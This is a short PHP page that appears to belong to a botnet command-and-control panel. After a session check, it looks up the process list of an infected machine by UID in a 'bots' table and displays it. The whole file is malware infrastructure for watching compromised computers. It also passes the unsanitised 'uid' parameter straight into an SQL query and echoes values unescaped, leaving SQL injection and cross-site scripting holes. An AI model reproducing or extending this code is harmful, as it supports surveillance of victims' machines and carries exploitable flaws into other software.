
<?php

session_start();
if(!isset($_SESSION['loggedin']))
{
die();
}

include ("config.php");

if(!empty($_GET["uid"]) && !empty($_GET["option"])) {

$uid = $_GET["uid"];
$option = $_GET["option"];

if($option==1) { //Diplsay process list

$query = "SELECT `Process List` FROM `bots` WHERE  `UID` = '$uid'";
$result = mysql_query($query);
$row = mysql_fetch_array($result);

echo "UID: <b>" . $uid . "</b><br />";
$rows =  substr_count($row["Process List"],"\n")+1;
echo "<textarea rows='" .$rows. "' cols=\"36\" readonly=\"readonly\">" . $row["Process List"] . "</textarea>";
}

} else { echo "WTF your looking for here!?!?"; }
?>